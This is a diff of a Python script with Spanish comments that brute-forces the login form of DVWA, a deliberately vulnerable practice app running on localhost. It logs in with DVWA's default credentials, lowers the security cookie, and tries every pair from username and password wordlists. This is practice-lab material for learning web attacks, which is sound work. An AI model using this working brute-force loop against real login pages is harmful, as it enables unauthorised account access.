@@ -1,11 +1,19 @@
 import requests
 
-url_login = 'http://localhost:8080/login.php'
-url_brute = 'http://localhost:8080/vulnerabilities/brute/'
+# URL de DVWA para la página de login y vulnerabilidad
+login_url = 'http://localhost:8080/login.php'
+brute_force_url = 'http://localhost:8080/vulnerabilities/brute/'
 
 # Archivos de texto con usuarios y contraseñas
 users_file = 'userlist.txt'
 passwords_file = 'passwordlist.txt'
+
+# Credenciales de inicio de sesión en DVWA
+login_data = {
+    'username': 'admin',  # Cambia según sea necesario
+    'password': 'password',  # Cambia según sea necesario
+    'Login': 'Login'
+}
 
 # Cabeceras HTTP a utilizar para la solicitud
 headers = {
@@ -13,29 +21,28 @@ headers = {
     'Content-Type': 'application/x-www-form-urlencoded'
 }
 
-# Función para leer las líneas de un archivo
+# Función para leer líneas de un archivo
 def read_lines(file_path):
     with open(file_path, 'r') as file:
         return [line.strip() for line in file.readlines()]
 
-# Obtener PHPSESSID de manera dinámica
-def get_phpsessid():
-    session = requests.Session()  # Crear una sesión para manejar cookies
-    response = session.get(url_login)  # Hacer la solicitud inicial
-    cookies = session.cookies.get_dict()  # Obtener las cookies en forma de diccionario
-    phpsessid = cookies.get('PHPSESSID', None)  # Extraer PHPSESSID
-    if phpsessid:
-        print(f'PHPSESSID obtenido: {phpsessid}')
-        return session, phpsessid  # Devolver la sesión con las cookies y el PHPSESSID
-    else:
-        print('No se pudo obtener PHPSESSID.')
-        return None, None
+# Función para obtener PHPSESSID dinámicamente
+def get_session_cookies():
+    session = requests.Session()
+    # Realiza el login en DVWA
+    session.post(login_url, data=login_data, headers=headers)
+    # Retorna las cookies de la sesión
+    return session.cookies
 
 # Función para realizar el ataque de fuerza bruta
-def brute_force_attack(session, phpsessid):
+def brute_force_attack():
     users = read_lines(users_file)
     passwords = read_lines(passwords_file)
-    
+    cookies = get_session_cookies()
+
+    # Añade el nivel de seguridad a las cookies
+    cookies.set('security', 'low', domain='localhost')
+
     for username in users:
         for password in passwords:
             data = {
@@ -43,16 +50,14 @@ def brute_force_attack(session, phpsessid):
                 'password': password,
                 'Login': 'Login'
             }
-            # Usar la sesión para realizar la solicitud POST
-            response = session.post(url_brute, headers=headers, data=data)
+            response = requests.post(brute_force_url, headers=headers, cookies=cookies, params=data)
 
             # Verificar el contenido de la página para encontrar el mensaje correcto
-            if 'Welcome to the password protected area' in response.text:
+            if 'Welcome to the password protected' in response.text:
                 print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
+                return
             else:
                 print(f'[FAILED] Usuario: {username} Contraseña: {password}')
 
 # Ejecutar el ataque de fuerza bruta
-session, phpsessid = get_phpsessid()  # Obtener PHPSESSID dinámicamente
-if session and phpsessid:
-    brute_force_attack(session, phpsessid)
+brute_force_attack()
